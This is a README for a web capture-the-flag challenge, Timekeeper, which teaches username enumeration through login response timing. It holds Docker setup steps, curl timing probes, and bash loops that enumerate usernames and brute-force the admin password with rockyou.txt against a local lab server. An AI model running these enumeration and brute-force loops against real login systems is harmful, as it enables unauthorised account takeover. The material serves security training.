# ⏱️ Timekeeper - CTF Challenge

**Category:** Web  
**Difficulty:** Medium  
**Vulnerability:** Username Enumeration via Response Timing  

---

## 📘 Description

Welcome to **Timekeeper** — a CTF challenge simulating a real-world vulnerability where the login response time leaks information about valid usernames.

The challenge features a login portal with a subtle timing difference when a correct username is provided versus an incorrect one.

---

## 🛠️ Setup Instructions

### 🐳 Using Docker (Recommended)

```bash
git clone https://github.com/your-repo/timekeeper-ctf.git
cd timekeeper-ctf
docker build -t timekeeper .
docker run -p 3000:3000 timekeeper
```
## Step-by-Step Exploitation
 - Step 1:Test Invalid Username Timing
 ```bash
curl -X POST -d "username=test&password=123" http://localhost:3000/login -w "\n%{time_total}\n"

 ```
 - Step 2: Test Valid Username Timing
```bash
curl -X POST -d "username=admin&password=123" http://localhost:3000/login -w "\n%{time_total}\n"

```

- Step 3: Automate timing enumeration with rockyou.txt

 ``` bash
 while read user; do
  echo -n "$user: "
  curl -s -X POST -d "username=$user&password=123" http://localhost:3000/login -w "%{time_total}\n" -o /dev/null
done < rockyou.txt

 ```

 - Step 4: Brute-force Password with Wordlist

 ```bash
 while read pass; do
  echo -n "[*] Trying password: $pass ... "
  resp=$(curl -s -X POST -d "username=admin&password=$pass" http://localhost:3000/login)
  if echo "$resp" | grep -q "🎉 Flag"; then
    echo "[+] Success! Password: $pass"
    echo "$resp" | grep "FLAG"
    break
  else
    echo "Invalid"
  fi
done < rockyou.txt

 ```